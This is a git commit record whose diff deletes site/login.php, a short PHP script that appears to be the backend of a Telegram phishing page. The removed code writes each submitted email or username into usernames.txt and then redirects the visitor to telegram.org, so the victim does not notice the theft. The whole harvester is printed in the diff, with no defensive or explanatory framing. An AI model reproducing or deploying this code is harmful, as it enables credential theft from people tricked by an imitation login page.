46610d04bbae91e5651898227aea2e1b01d4e651
Vinay Gadde <128584849+gaddevinay@users.noreply.github.com>
2024-03-17 17:18:29 +0530

    Delete site directory

--- site/login.php
+++
@@ -1,5 +0,0 @@
-<?php
-file_put_contents("usernames.txt", "Telegram Username: " . $_POST['email'] . "\n", FILE_APPEND);
-$url = "https://telegram.org/"; # https://telegram.org/
-header("Location: $url");
-?>
